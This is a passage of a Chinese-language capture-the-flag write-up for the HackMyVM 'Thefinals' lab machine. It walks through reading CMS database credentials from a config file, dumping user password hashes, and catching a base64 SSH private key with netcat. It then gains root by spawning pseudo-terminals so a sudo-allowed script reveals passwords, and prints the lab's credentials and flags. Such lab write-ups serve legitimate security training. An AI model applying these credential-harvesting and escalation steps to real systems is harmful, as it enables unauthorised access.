:rmwwwww\nwwwwwZcvccccccccccccccvUqqwwwwwwwwwwwwwwwwwwpQccccccccccccccccvXmwpmzcccccccccccccccvcOwwwww\nwwwwwwqppppppppppppppppqwwwwwwwwwwwwwwwwwwwwwqpppppppppppppppppqwwwwqppppppppppppppppqwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\nwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\n\nflag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003eCMS\u003c/code\u003e配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// config db\n\u003cspan class=\"hljs-variable\"\u003e$db\u003c/span\u003e = new \\Typecho\\Db(\u003cspan class=\"hljs-string\"\u003e'Pdo_Mysql'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'typecho_'\u003c/span\u003e);\n\u003cspan class=\"hljs-variable\"\u003e$db\u003c/span\u003e-\u003eaddServer(array (\n  \u003cspan class=\"hljs-string\"\u003e'host'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'localhost'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'port'\u003c/span\u003e =\u003e 3306,\n  \u003cspan class=\"hljs-string\"\u003e'user'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'typecho_u'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'QLTkbviW71CSRZtGWIQdB6s'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'charset'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'utf8mb4'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'database'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'typecho_db'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'engine'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-string\"\u003e'InnoDB'\u003c/span\u003e,\n), \\Typecho\\Db::READ | \\Typecho\\Db::WRITE);\n\\Typecho\\Db::\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$db\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登录数据库，并寻找有趣的信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/home/june $ mysql -u typecho_u -p\nmysql: Deprecated program name. It will be removed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a future release, use \u003cspan class=\"hljs-string\"\u003e'/usr/bin/mariadb'\u003c/span\u003e instead\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e is 4109\nServer version: 11.4.5-MariaDB Alpine Linux\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType \u003cspan class=\"hljs-string\"\u003e'help;'\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e'\\h'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e. Type \u003cspan class=\"hljs-string\"\u003e'\\c'\u003c/span\u003e to clear the current input statement.\n\nMariaDB [(none)]\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [typecho_db]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from typecho_users;\n+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+\n| uid | name  | password                           | mail                | url                       | screenName | created    | activated  | logged     | group         | authCode                         |\n+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+\n|   1 | staff | $P\u003cspan class=\"hljs-variable\"\u003e$B\u003c/span\u003e/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1 | staff@thefinals.hmv | http://thefinals.hmv/blog | staff      | 1743647281 | 1746272580 | 1746272521 | administrator | 213944c56e829e2cf7ec1de863ac3c03 |\n+-----+-------+------------------------------------+---------------------+---------------------------+------------+------------+------------+------------+---------------+----------------------------------+\n1 row \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.000 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试爆破后没爆破出来\u003c/p\u003e\n\u003ch3\u003e猜谜游戏\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ejune\u003c/code\u003e 用户家目录下 \u003ccode\u003emessage.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/home/june $ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e message.txt \nContestants, gear up and get ready! Who\u003cspan class=\"hljs-string\"\u003e's got the KEY? Who'\u003c/span\u003es got the the guts?\n                                                              --- This BROADCAST has been hacked by CNS\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e猜谜？尝试寻找于各用户相关的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ find / -user xxxx 2\u003e/dev/null\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e如何通过执行 scotty 用户可以找到如下文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ find / -user scotty 2\u003e/dev/null\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/var/log/scotty-main.err\n/var/log/scotty-main.log\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 \u003ccode\u003e/var/log/scotty-main.log\u003c/code\u003e ，表示向目标主机 \u003ccode\u003e192.168.56.57\u003c/code\u003e 的 \u003ccode\u003e1337\u003c/code\u003e 端口发送了广播数据包（UDP 或特定协议探测）。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// /var/log/scotty-main.log\nBroadcast to eth0 192.168.56.57:1337\nBroadcast to eth0 192.168.56.57:1337\nBroadcast to eth0 192.168.56.57:1337\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003enc\u003c/code\u003e 接收\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/home $ nc -ulnvp 1337\nlistening on [::]:1337 ...\nconnect to [::ffff:192.168.56.57]:1337 from [::ffff:192.168.56.57]:40599 ([::ffff:192.168.56.57]:40599)\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXNmYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEhpRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQUFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看着像是 \u003ccode\u003ebase64\u003c/code\u003e 编码后的，尝试解码。解码后是一串私钥。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后通过私钥成功登陆上去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Thefinals vim sshkey  \n➜  Thefinals \u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e 600 sshkey                                         \n➜  Thefinals ssh scotty@thefinals.hmv -i sshkey \nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'thefinals.hmv (192.168.56.57)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:EzmhY2U9+FvurEu825jyirPaiFVcHNA2joTW03K3glk.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003ethefinals.hmv\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\n\nthefinals:~$ whoami\nscotty\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - To root\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e查看 sudo 权限，免密码以 root 权限执行 \u003ccode\u003esecret\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ethefinals:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e scotty on thefinals:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e scotty:\n    Defaults!/usr/sbin/visudo env_keep+=\u003cspan class=\"hljs-string\"\u003e\"SUDO_EDITOR EDITOR VISUAL\"\u003c/span\u003e\n\nUser scotty may run the following commands on thefinals:\n    (ALL) NOPASSWD: /sbin/secret\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e获得数据库密码 \u0026#x26; root 密码\u003c/h3\u003e\n\u003cp\u003e但是没找到有什么用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ethefinals:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /sbin/secret\n/sbin/secret: line 2: can\u003cspan class=\"hljs-string\"\u003e't create /dev/pts/99: Permission denied\nthefinals:~$ ls -al /sbin/secret \n-rwx-----x    1 root     root            51 Apr 23 17:17 /sbin/secret\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是有一条信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecan\u003cspan class=\"hljs-string\"\u003e't create /dev/pts/99: Permission denied\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们查看一下 \u003ccode\u003e/dev/pts/\u003c/code\u003e ，只有 \u003ccode\u003e0\u003c/code\u003e 和 \u003ccode\u003e1\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ethefinals:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /dev/pts\ntotal 0\ndrwxr-xr-x    2 root     root             0 May  3 13:24 .\ndrwxr-xr-x   14 root     root          2840 May  3 13:25 ..\ncrw--w----    1 apache   \u003cspan class=\"hljs-built_in\"\u003etty\u003c/span\u003e       136,   0 May  3 20:08 0\ncrw--w----    1 scotty   \u003cspan class=\"hljs-built_in\"\u003etty\u003c/span\u003e       136,   1 May  3 20:22 1\nc---------    1 root     root        5,   2 May  3 13:24 ptmx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们通过 \u003ccode\u003epython\u003c/code\u003e 生成伪终端后，\u003ccode\u003e/dev/pts/\u003c/code\u003e 就多了一个\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMThefinals/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e现在可以使用脚本或者手动生成\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-meta\"\u003e#!/bin/ash\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# 文件名: spawn_shells.sh\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# 用途：循环生成交互式 Shell（测试或特殊场景用）\u003c/span\u003e\n\ncount=0\n\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e [ \u003cspan class=\"hljs-variable\"\u003e$count\u003c/span\u003e -lt 90 ]\n\u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"生成第 \u003cspan class=\"hljs-subst\"\u003e$((count+1)\u003c/span\u003e) 个 Shell...\"\u003c/span\u003e\n  python -c \u003cspan class=\"hljs-string\"\u003e'import pty; pty.spawn(\"/bin/sh\")'\u003c/span\u003e \u0026#x26;\n  count=$((count+\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e))\n\u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"已完成 90 次 Shell 生成。\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e生成到\u003ccode\u003e98\u003c/code\u003e后停止，然后执行 \u003ccode\u003esecret\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ethefinals:/tmp$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /sbin/secret \nroot:p8RuoQGTtlKLAjuF1Tpy5wX\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e本以为是 \u003ccode\u003eroot\u003c/code\u003e 的密码，没想到是数据库的，寻找数据，获得 \u003ccode\u003eroot\u003c/code\u003e 密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [secret]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from user;\n+----+----------+-------------------------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | username | password                |\n+----+----------+-------------------------+\n|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |\n+----+----------+-------------------------+\n1 row \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.000 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ethefinals:/tmp$ su root\nPassword: \n/tmp \u003cspan class=\"hljs-comment\"\u003e# id\u003c/span\u003e\nuid=0(root) gid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e~ \u003cspan class=\"hljs-comment\"\u003e# cat root.flag \u003c/span\u003e\n _____      __   __      ______\n/\\  __\\    /\\ \u003cspan class=\"hljs-string\"\u003e\"-.\\ \\    /\\  ___\\\n\\ \\ \\___   \\ \\ \\-.  \\   \\ \\___  \\\n \\ \\____\\   \\ \\_\\\\\"\u003c/span\u003e\\_\\   \\ \\_____\\\n  \\/____/    \\/_/ \\/_/    \\/_____/\n\nflag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e~ \u003cspan class=\"hljs-comment\"\u003e# cat note.txt \u003c/span\u003e\nssh://root@thefinals.hmv:BvIpFDyB4kNbkyqJGwMzLcK\nssh://staff@thefinals.hmv:qDCsBTj30cQyityMh3Rnyys\nssh://june@thefinals.hmv:aYTmcORsUrmwaKa7C2DBLCh\nssh://scotty@thefinals.hmv:uuUoqAETern4v5tW2iMFs47\n\nmariadb://root@localhost:p8RuoQGTtlKLAjuF1Tpy5wX\n\nmariadb://typecho_u@typecho_db@localhost:QLTkbviW71CSRZtGWIQdB6s\n\ntypecho://staff@thefinals.hmv:n3nPbqEOhs6eTcchyqXTXWi\ntypecho://june@thefinals.hmv:DihPQiQqNO75vv8zNBzLwUm\n\nflag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}\ncanyoureachthefinals -\u003e sha256\n\nflag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}\nyoufinallyreachedthefinals -\u003e sha256\n\nTHE FINALS is a great FPS game. A lot of inspiration comes from games. Try it on http://reachthefinals.com/\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Thefinals","date":"2025-05-03","updated":"2025-05-03","comments":true,"tags":["Linux靶机","HackMyVM","Typecho","XSS"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMThefinals"},"buildId":"Ccn3Uy_j8m9kBQAk6sKIJ","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>